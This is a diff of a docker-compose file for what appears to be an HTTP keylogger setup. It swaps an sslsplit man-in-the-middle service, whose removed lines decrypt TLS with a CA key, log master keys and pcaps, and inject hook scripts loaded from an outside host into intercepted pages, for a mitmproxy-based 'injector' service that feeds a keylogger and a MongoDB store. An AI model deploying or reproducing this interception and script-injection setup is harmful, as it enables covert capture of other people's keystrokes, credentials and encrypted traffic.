@@ -1,35 +1,19 @@
 version: '3.5'
 
 services: 
-  sslsplit:
-    image: nesatfit/sslsplit:latest
+  injector:
+    image: injector
+    container_name: injector
     build:
-      dockerfile: ./docker/sslsplit/Dockerfile
-      context: ./sslsplit
-    container_name: keylogger_sslsplit
+      context: ./injector
+    volumes:
+      - C:/Data/http_keylogger/injector/mitmproxy:/root/.mitmproxy
+    ports:
+      - 8080:8080
     environment:
       - HOOK_HOST=$HOOK_HOST
       - HOOK_PORT_HTTP=$HOOK_PORT_HTTP
       - HOOK_PORT_HTTPS=$HOOK_PORT_HTTPS
-    command:
-      -k /data/key/ca.key  
-      -c /data/key/ca.crt 
-      -D 
-      -K /data/key/ca.key
-      -P
-      -l /data/log/connections.log 
-      -S /data/log 
-      -H "<script src='http://$HOOK_HOST:$HOOK_PORT_HTTP/hook' type='text/javascript'></script>" 
-      -H "<script src='https://$HOOK_HOST:$HOOK_PORT_HTTPS/hook' type='text/javascript'></script>"
-      -X /data/pcaps/$PCAP_FILE_NAME
-      -M /data/master_keys 
-      https 0.0.0.0 8443 
-      http 0.0.0.0 8080
-    network_mode: "host"
-    volumes:
-      - ./data:/data
-    working_dir: /data
-    restart: unless-stopped
 
   keylogger:
     image: nesatfit/keylogger:latest
@@ -44,8 +28,6 @@ services:
     restart: unless-stopped
 
   mongo:
-    container_name: keylogger_mongo 
+    container_name: keylogger_mongo
     image: mongo
     restart: unless-stopped
-
-
